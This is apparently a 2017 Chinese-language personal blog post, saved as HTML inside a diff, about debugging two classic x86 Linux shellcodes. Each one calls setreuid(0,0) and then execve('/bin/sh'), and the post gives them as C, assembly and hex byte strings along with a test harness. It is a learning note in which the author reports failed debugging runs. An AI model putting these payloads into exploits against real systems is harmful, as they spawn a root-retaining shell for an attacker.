@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Debug Shellcode"/>
+
+
+
+
+  <meta name="keywords" content="shellcode, pwn, gdb, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2017/09/05/Debug-Shellcode/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Debug Shellcode - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Debug Shellcode
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-09-05
+        </span>
+        
+          <div class="post-category">
+            
+              <a href="/categories/RE-note/">RE note</a>
+            
+          </div>
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-1"><span class="toc-text">shellcode 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-code"><span class="toc-text">C code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asm-code"><span class="toc-text">asm code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-test-amp-debug"><span class="toc-text">shellcode test&debug</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode2"><span class="toc-text">shellcode2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#asm-code-1"><span class="toc-text">asm code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#refrence"><span class="toc-text">refrence</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <p>记录几个自己碰到的关于shellcode的问题, 一个都没解决…如果有知道解决方法的请发我邮箱(邮箱在页面最下方), 谢谢!</p>
+<h2 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode 1"></a>shellcode 1</h2><p>最简单的shellcode形式大概就是直接调用execve(“/bin/sh”, {“/bin/sh”, NULL}, NULL)系统调用了吧…并不是十分清楚, 所以如果说错的话就当我没说…</p>
+<h3 id="C-code"><a href="#C-code" class="headerlink" title="C code"></a>C code</h3><p>先从C代码开始:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">main()&#123;</div><div class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">"bin/sh"</span>, <span class="literal">NULL</span>&#125;;</div><div class="line">    setuid(<span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    execve(<span class="string">"/bin/sh"</span>, argv, <span class="literal">NULL</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译运行以上程序, 我们就能够得到一个shell了.<br><a id="more"></a></p>
+<h3 id="asm-code"><a href="#asm-code" class="headerlink" title="asm code"></a>asm code</h3><p> 按照上面的思路, 转成汇编代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">global _start</div><div class="line">_start:</div><div class="line">    ;setreuid(0, 0)</div><div class="line">    xor eax, eax </div><div class="line">    xor ebx, ebx	;ruid = 0</div><div class="line">    xor ecx, ecx 	;euid = 0</div><div class="line">    mov al,0x46		;sys_setreuid</div><div class="line">    int 0x80</div><div class="line">    ;execve(&quot;/bin//sh&quot;, argv, NULL)</div><div class="line">    xor eax, eax </div><div class="line">    push eax	;NULL, 字符串截断符</div><div class="line">    ;&quot;//sh&quot;, 第二个&apos;/&apos;是为了填充字节, 在命令行输入/bin//sh是可以执行成功的</div><div class="line">    push 0x68732f2f	</div><div class="line">    push 0x6e69622f	;&quot;/bin&quot;</div><div class="line">    mov ebx, esp </div><div class="line">    push eax 	;NULL, 设置argv[1]为空</div><div class="line">    push ebx </div><div class="line">    mov ecx, esp </div><div class="line">    mov al, 0x0b	;sys_execve</div><div class="line">    int 0x80</div></pre></td></tr></table></figure>
+<p>具体栈内数据如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">low--&gt;  ++++++++++++++</div><div class="line">        +    argv    + &lt;-- argv = sh_addr(addr of &apos;/bin//sh&apos;)</div><div class="line">        ++++++++++++++</div><div class="line">        +     0      + &lt;-- argv [1]</div><div class="line">sh_addr ++++++++++++++</div><div class="line">        +    /bin    +</div><div class="line">        ++++++++++++++</div><div class="line">        +    //sh    +</div><div class="line">        ++++++++++++++</div><div class="line">        +     0      +</div><div class="line">high--&gt; ++++++++++++++</div></pre></td></tr></table></figure></p>
+<p>编译运行以后就能够成功拿到shell了, 然后用objdump反汇编, 就可以得到shellcode. 这段代码出自《Grey Hat Hacking》一书, 我尝试着想把它改成下面的形式, 但是程序报错Address boundary error. 后面发现原因: argv是一个指针数组, 如果要把它写到.data段中, 就需要知道argv在data中的具体地址. 这种做法是不可取的, 因为.data段的地址不是固定的.</p>
+<p>但是, 如果要想用这种<code>db &quot;/bin/sh&quot;</code>形式, 也还是办法的. 具体见下面的<code>shellcode2</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">section .data</div><div class="line">shell db &apos;/bin//sh&apos;, 0</div></pre></td></tr></table></figure>
+<h3 id="shellcode-test-amp-debug"><a href="#shellcode-test-amp-debug" class="headerlink" title="shellcode test&amp;debug"></a>shellcode test&amp;debug</h3><p>一种常见的测试shellcode是否可用的方法是:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*char sc[] = your_shellcode;*/</span></div><div class="line"><span class="keyword">char</span> sc[] = </div><div class="line">      <span class="string">"\x31\xc0"</span>              <span class="comment">//xor    eax,eax</span></div><div class="line">      <span class="string">"\x31\xdb"</span>              <span class="comment">//xor    ebx,ebx</span></div><div class="line">      <span class="string">"\x31\xc9"</span>              <span class="comment">//xor    ecx,ecx</span></div><div class="line">      <span class="string">"\xb0\x46"</span>              <span class="comment">//mov    al,0x46</span></div><div class="line">      <span class="string">"\xcd\x80"</span>              <span class="comment">//int    0x80</span></div><div class="line">      <span class="string">"\x31\xc0"</span>              <span class="comment">//xor    eax,eax</span></div><div class="line">      <span class="string">"\x50"</span>                  <span class="comment">//push   eax</span></div><div class="line">      <span class="string">"\x68\x2f\x2f\x73\x68"</span>  <span class="comment">//push   0x68732f2f</span></div><div class="line">      <span class="string">"\x68\x2f\x62\x69\x6e"</span>  <span class="comment">//push   0x6e69622f</span></div><div class="line">      <span class="string">"\x89\xe3"</span>              <span class="comment">//mov    ebx,esp</span></div><div class="line">      <span class="string">"\x50"</span>                  <span class="comment">//push   eax</span></div><div class="line">      <span class="string">"\x53"</span>                  <span class="comment">//push   ebx</span></div><div class="line">      <span class="string">"\x89\xe1"</span>              <span class="comment">//mov    ecx,esp</span></div><div class="line">      <span class="string">"\xb0\x0b"</span>              <span class="comment">//mov    al,0xb</span></div><div class="line">      <span class="string">"\xcd\x80"</span>              <span class="comment">//int    0x80</span></div><div class="line">main()&#123;</div><div class="line">    <span class="keyword">void</span> (*fp)(<span class="keyword">void</span>);</div><div class="line">    fp = (<span class="keyword">void</span> *) sc;</div><div class="line">    fp();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>用以上的方法对上述shellcode测试, 发现报<code>SIGSEGV</code>(Address boundary error)的错……用gdb调试, 发现了这样的结果, 一路下来程序执行的非常顺利, 栈上的数据也没有什么问题, 但是调用最后一个0x80的时候并没有getshell, 继续单步执行反而报了segment fault的错.</p>
+<p>我是在protostar虚拟机里面测试的这段shellcode, 在ubuntu下好像被什么神秘的保护机制给挡住了…连shellcode起始地址都不跳进去就报错…好了, 虽然没有调试成功这段shellcode, 但就当作我已经测试成功了…接下来继续看下一段shellcode.</p>
+<h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>这段shellcode的原出处在<a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">Here</a>. 它的设计思路和shellcode1一样. </p>
+<h3 id="asm-code-1"><a href="#asm-code-1" class="headerlink" title="asm code"></a>asm code</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">;shellex.asm</div><div class="line">[SECTION .text]</div><div class="line">global _start</div><div class="line">_start:</div><div class="line">    xor eax, eax</div><div class="line">    mov al, 70       	;setreuid is syscall 70</div><div class="line">    xor ebx, ebx</div><div class="line">    xor ecx, ecx</div><div class="line">    int 0x80</div><div class="line">    jmp short ender</div><div class="line">    </div><div class="line">    starter:</div><div class="line">    pop ebx            	;get the address of the string</div><div class="line">    xor eax, eax</div><div class="line">    mov [ebx+7], al   	;put a NULL where the N is in the string</div><div class="line">    mov [ebx+8], ebx  	;put the address of the string to where the</div><div class="line">                       	;AAAA is</div><div class="line">    mov [ebx+12], eax  	;put 4 null bytes into where the BBBB is</div><div class="line">    mov al, 11     		;execve is syscall 11</div><div class="line">    lea ecx, [ebx+8]   	;load the address of where the AAAA was</div><div class="line">    lea edx, [ebx+12]   ;load the address of the NULLS</div><div class="line">    int 0x80            ;call the kernel, WE HAVE A SHELL!</div><div class="line"></div><div class="line">    ender:</div><div class="line">    call starter</div><div class="line">    db &apos;/bin/shNAAAABBBB&apos;</div></pre></td></tr></table></figure>
+<p>整个代码的逻辑感觉没有什么问题, 但是依然报错, 而且这次是运行可执行文件的时候就报错.报错情况如下:</p>
+<p><img src="./sc2.png" alt=""></p>
+<p>可以看到程序是没有开任何保护机制的, 不知道又是哪股神秘的力量阻挡了shellcode的执行…</p>
+<p><img src="./sc2_sec.png" alt=""></p>
+<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>可能是因为我给的两段shellcode的例子都比较老了, 所以问题才这么多吧. 不过我的确是在做PWN题目时候碰到过已经JMP进shellcode, 还报Segment Fault的错(那段shellcode是用<code>gef</code>工具生成的). 感觉shellcode真是一个神秘的东西.</p>
+<h3 id="refrence"><a href="#refrence" class="headerlink" title="refrence"></a>refrence</h3><ol>
+<li><p>《Grey hat hacking》</p>
+</li>
+<li><p><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">Shellcoding for Linux and Windows Tutorial</a></p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/shellcode/">shellcode</a>
+            
+              <a href="/tags/pwn/">pwn</a>
+            
+              <a href="/tags/gdb/">gdb</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/09/04/protostar-stack-easy/">
+        <span class="next-text nav-default">Protostar Stack Easy</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
